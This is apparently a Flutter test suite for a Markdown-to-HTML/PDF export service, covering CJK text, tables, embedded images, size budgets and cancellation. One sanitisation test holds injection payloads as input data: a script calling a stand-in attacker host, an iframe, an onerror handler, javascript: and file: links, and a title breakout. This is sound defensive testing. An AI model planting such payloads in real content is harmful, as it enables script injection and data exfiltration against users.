import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:linefold/src/services/attachment_resolver.dart';
import 'package:linefold/src/services/document_export_service.dart';

import 'attachment_test_support.dart';

DocumentExportSnapshot snapshot(String source, {String? root = '/vault'}) =>
    DocumentExportSnapshot(
      documentId: 'a',
      title: '中文笔记.md',
      source: source,
      documentPath: '/vault/note.md',
      root: root,
    );

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  test(
    'complete CJK source, GFM, front matter and offline fidelity notices',
    () async {
      const source =
          '---\ntitle: 中文😀\n---\n# 文档标题\n\n**加粗** and *斜体*\n\n'
          '| 姓名 | 数值 |\n| --- | ---: |\n| 中文 | 123 |\n\n'
          '- [x] 完成\n- [ ] 待办\n\n'
          '```mermaid\ngraph LR; A-->B\n```\n\n'
          r'公式 $x^2$'
          '\n\n\$\$\nx^2+y^2\n\$\$\n';
      final sourceProvider = FakeAttachmentSource();
      final output = await DocumentExportService(
        attachmentSource: sourceProvider,
      ).build(snapshot(source), isCurrent: () => true);
      expect(output.html, startsWith('<!doctype html>'));
      expect(output.html, contains('<meta charset="utf-8">'));
      expect(output.html, contains('<h1>文档标题</h1>'));
      expect(output.html, contains('<strong>加粗</strong>'));
      expect(output.html, contains('<em>斜体</em>'));
      expect(output.html, contains('<thead>'));
      expect(output.html, contains('<td class="align-right">123</td>'));
      expect(output.html, contains('☑'));
      expect(output.html, contains('☐'));
      expect(output.html, contains('title: 中文😀'));
      expect(output.html, contains('graph LR; A--&gt;B'));
      expect(output.html, contains('math-source'));
      expect(output.html, contains(documentExportFidelityNotice));
      expect(output.html, contains('table-layout: fixed'));
      expect(output.html, contains('table-header-group'));
      expect(output.html, contains('white-space: pre-wrap'));
      expect(sourceProvider.reads, isEmpty);
      expect(source, contains('**加粗**'));
    },
  );

  test(
    'source HTML, attributes, links and title cannot inject active content',
    () async {
      const source = '''<script>fetch('https://attacker.test')</script>
<iframe src="https://attacker.test"></iframe>
<img src="file:///private/secret" onerror="alert(1)">
<a href="javascript:alert(1)">bad</a>

[bad](javascript:alert%281%29) [bad2](data:text/html,test)
[local](file:///private/secret) [relative](../secret.md)
[good](https://example.com/path?q=1&x=2) [mail](mailto:test@example.com)
![remote](https://example.com/track.png)
''';
      final provider = FakeAttachmentSource();
      final value = DocumentExportSnapshot(
        documentId: 'a',
        title: '</title><script>bad</script>',
        source: source,
        root: '/vault',
        documentPath: '/vault/note.md',
      );
      final html = (await DocumentExportService(
        attachmentSource: provider,
      ).build(value, isCurrent: () => true)).html;
      expect(html, isNot(contains('<script')));
      expect(html, isNot(contains('<iframe')));
      expect(html, isNot(contains('<img src="file:')));
      expect(html, isNot(contains('href="javascript:')));
      expect(html, isNot(contains('href="data:')));
      expect(html, isNot(contains('href="file:')));
      expect(html, isNot(contains('href="../')));
      expect(
        html,
        contains('href="https:&#47;&#47;example.com&#47;path?q=1&amp;x=2"'),
      );
      expect(html, contains('href="mailto:test@example.com"'));
      expect(html, contains('&lt;script&gt;'));
      expect(provider.reads, isEmpty);
      expect(provider.listCalls, 0);
    },
  );

  test(
    'authorized raster images embed bounded re-encoded PNG, never paths',
    () async {
      final provider = FakeAttachmentSource();
      final service = DocumentExportService(attachmentSource: provider);
      final source = snapshot(
        '![图示](assets/image.png)\n\n![[assets/image.png]]\n\ninline ![[assets/image.png|别名]]',
      );
      final output = await service.build(source, isCurrent: () => true);
      expect(
        RegExp('<img src="data:image/png;base64,').allMatches(output.html),
        hasLength(3),
      );
      expect(output.html, isNot(contains('/vault/')));
      expect(output.html, isNot(contains('src="assets/')));
      final data = RegExp(
        r'data:image/png;base64,([^\"]+)',
      ).firstMatch(output.html)![1]!;
      expect(base64Decode(data).take(8), [137, 80, 78, 71, 13, 10, 26, 10]);
      expect(provider.reads.where((x) => x == 'assets/image.png').length, 1);
    },
  );

  test(
    'remote, missing, denied, unsupported and no-scope assets are visible placeholders',
    () async {
      for (final root in ['/vault', null]) {
        final provider = FakeAttachmentSource();
        final output = await DocumentExportService(attachmentSource: provider)
            .build(
              snapshot(
                '![remote](https://example.com/x.png)\n\n![missing](missing.png)\n\n![[image.svg]]',
                root: root,
              ),
              isCurrent: () => true,
            );
        expect(output.html, contains('image unavailable'));
        expect(output.notices.length, greaterThan(1));
        expect(output.html, isNot(contains('<img')));
        if (root == null) expect(provider.reads, isEmpty);
      }
      final provider = FakeAttachmentSource()
        ..imageError = const AttachmentFailure(AttachmentFailureKind.denied);
      final output = await DocumentExportService(
        attachmentSource: provider,
      ).build(snapshot('![denied](assets/image.png)'), isCurrent: () => true);
      expect(output.notices.join(), contains('access denied'));
    },
  );

  test(
    'image count and total bytes budgets never silently omit images',
    () async {
      final output =
          await DocumentExportService(
            attachmentSource: FakeAttachmentSource(),
            maximumImages: 1,
            maximumImageBytes: 1,
          ).build(
            snapshot('![one](assets/image.png)\n\n![two](assets/image.png)'),
            isCurrent: () => true,
          );
      expect(output.html, isNot(contains('<img')));
      expect(output.notices.join(), contains('byte limit'));
      expect(output.notices.join(), contains('count limit'));
    },
  );

  test('source and output overflow fail without partial export', () async {
    await expectLater(
      const DocumentExportService().build(
        snapshot('a' * 5000),
        isCurrent: () => true,
      ),
      throwsA(isA<DocumentExportFailure>()),
    );
    await expectLater(
      const DocumentExportService(
        maximumOutputBytes: 1,
      ).build(snapshot('small'), isCurrent: () => true),
      throwsA(isA<DocumentExportFailure>()),
    );
  });

  test('output budget counts each cached image and stops later reads', () async {
    final baseline = await DocumentExportService(
      attachmentSource: FakeAttachmentSource(),
    ).build(snapshot('![same](assets/image.png)'), isCurrent: () => true);
    final provider = FakeAttachmentSource()
      ..files['assets/later.png'] = tinyPng;
    final source = snapshot(
      '${List.filled(30, '![same](assets/image.png)').join('\n\n')}\n\n![later](assets/later.png)',
    );
    await expectLater(
      DocumentExportService(
        attachmentSource: provider,
        maximumOutputBytes: utf8.encode(baseline.html).length + 100,
      ).build(source, isCurrent: () => true),
      throwsA(isA<DocumentExportFailure>()),
    );
    expect(
      provider.reads.where((path) => path == 'assets/image.png'),
      hasLength(1),
    );
    expect(provider.reads, isNot(contains('assets/later.png')));
    expect(source.source, endsWith('![later](assets/later.png)'));
  });

  test(
    'UTF-8 and escaping budget includes envelope and stops before assets',
    () async {
      final empty = await const DocumentExportService().build(
        snapshot(''),
        isCurrent: () => true,
      );
      final fixedBytes = utf8.encode(empty.html).length;
      // Headers/CSS/footer/fidelity notes alone exhaust this budget, before I/O.
      final envelopeProvider = FakeAttachmentSource();
      await expectLater(
        DocumentExportService(
          attachmentSource: envelopeProvider,
          maximumOutputBytes: fixedBytes - 1,
        ).build(snapshot('![image](assets/image.png)'), isCurrent: () => true),
        throwsA(isA<DocumentExportFailure>()),
      );
      expect(envelopeProvider.listCalls, 0);
      for (final source in ['<&"/中文😀' * 20, '中😀' * 40]) {
        final value = snapshot('$source\n\n![image](assets/image.png)');
        final provider = FakeAttachmentSource();
        await expectLater(
          DocumentExportService(
            attachmentSource: provider,
            maximumOutputBytes: fixedBytes + source.length + 20,
          ).build(value, isCurrent: () => true),
          throwsA(isA<DocumentExportFailure>()),
        );
        expect(
          provider.listCalls,
          0,
          reason:
              'Escaping/multibyte overflow stops before the following image.',
        );
      }
      final unicode = snapshot('中文😀 & < > "/');
      final rendered = await const DocumentExportService().build(
        unicode,
        isCurrent: () => true,
      );
      final exactBytes = utf8.encode(rendered.html).length;
      expect(
        (await DocumentExportService(
          maximumOutputBytes: exactBytes,
        ).build(unicode, isCurrent: () => true)).html,
        rendered.html,
      );
      await expectLater(
        DocumentExportService(
          maximumOutputBytes: exactBytes - 1,
        ).build(unicode, isCurrent: () => true),
        throwsA(isA<DocumentExportFailure>()),
      );
    },
  );

  test('dynamic notes are budgeted before reading subsequent assets', () async {
    final empty = await const DocumentExportService().build(
      snapshot(''),
      isCurrent: () => true,
    );
    final provider = FakeAttachmentSource();
    await expectLater(
      DocumentExportService(
        attachmentSource: provider,
        maximumOutputBytes: utf8.encode(empty.html).length + 20,
      ).build(
        snapshot(
          '![blocked](https://example.com/no.png)\n\n![later](assets/image.png)',
        ),
        isCurrent: () => true,
      ),
      throwsA(isA<DocumentExportFailure>()),
    );
    expect(provider.listCalls, 0);
  });

  for (final phase in ['list', 'settings', 'normalize', 'image']) {
    test(
      'scope invalidation at $phase prevents every subsequent native call',
      () async {
        final provider = _PhaseBlockedAttachmentSource(phase);
        var current = true;
        final result = DocumentExportService(attachmentSource: provider).build(
          snapshot('![image](assets/image.png)\n\n![later](assets/later.png)'),
          isCurrent: () => current,
        );
        await provider.reached.future;
        final started = List<String>.of(provider.calls);
        current = false;
        provider.release.complete();
        await expectLater(result, throwsA(isA<DocumentExportFailure>()));
        expect(
          provider.calls,
          started,
          reason: 'Already-started I/O may finish; no new call may start.',
        );
      },
    );
  }

  test('scope invalidation during an attachment read stops export', () async {
    final blocked = Completer<void>();
    final provider = FakeAttachmentSource()..beforeRead = blocked.future;
    var current = true;
    final result = DocumentExportService(
      attachmentSource: provider,
    ).build(snapshot('![image](assets/image.png)'), isCurrent: () => current);
    await Future<void>.delayed(const Duration(milliseconds: 20));
    current = false;
    blocked.complete();
    await expectLater(result, throwsA(isA<DocumentExportFailure>()));
  });

  test(
    'native command contains immutable source result and cancellation is false',
    () async {
      final messenger =
          TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger;
      MethodCall? received;
      messenger.setMockMethodCallHandler(AppleDocumentExportPlatform.channel, (
        call,
      ) async {
        received = call;
        return false;
      });
      addTearDown(
        () => messenger.setMockMethodCallHandler(
          AppleDocumentExportPlatform.channel,
          null,
        ),
      );
      const value = ExportedDocument('<!doctype html>captured', []);
      expect(
        await const AppleDocumentExportPlatform().output(
          action: DocumentExportAction.pdf,
          document: value,
          snapshot: snapshot('captured'),
        ),
        isFalse,
      );
      expect(received!.method, 'pdf');
      expect((received!.arguments as Map)['html'], value.html);
      expect((received!.arguments as Map).containsKey('source'), isFalse);
    },
  );

  test('emit synthetic native PDF fixture from the actual generator', () async {
    final source = StringBuffer('# 中文文档 CJK START 😀\n\n');
    source.writeln(
      '| 表格列一 HEADER_ONE | 表格列二 HEADER_TWO | 表格列三 HEADER_THREE | 表格列四 HEADER_FOUR |',
    );
    source.writeln('| --- | --- | --- | --- |');
    for (var i = 0; i < 150; i++) {
      source.writeln(
        '| 第$i行 CELL_${i}_A | 中文内容 CELL_${i}_B | 中间列 CELL_${i}_C | 末列 CELL_${i}_D |',
      );
    }
    source.writeln(
      '\n```text\n${'长代码 ABCDEFGHIJKLMNOPQRSTUVWXYZ ' * 35}\nCODE_END\n```\n\n文档结束 CJK END',
    );
    // Keep the same production input budgets; this corpus is synthetic only.
    final output = await const DocumentExportService().build(
      snapshot(source.toString()),
      isCurrent: () => true,
    );
    final directory = Directory('build/export-qa')..createSync(recursive: true);
    File('${directory.path}/pagination.html').writeAsStringSync(output.html);
    expect(output.html, contains('CELL_149_D'));
  });
}

class _PhaseBlockedAttachmentSource extends FakeAttachmentSource {
  _PhaseBlockedAttachmentSource(this.phase);
  final String phase;
  final reached = Completer<void>();
  final release = Completer<void>();
  final calls = <String>[];
  Future<T> _call<T>(String name, Future<T> Function() run) async {
    calls.add(name);
    if (name == phase) {
      reached.complete();
      await release.future;
    }
    return run();
  }

  @override
  Future<List<AttachmentMetadata>> list(String root) =>
      _call('list', () => super.list(root));
  @override
  Future<List<String>> normalize(List<String> paths) =>
      _call('normalize', () => super.normalize(paths));
  @override
  Future<Uint8List> read(String root, String path, int maximum) => _call(
    path == '.obsidian/app.json' ? 'settings' : 'image',
    () => super.read(root, path, maximum),
  );
}
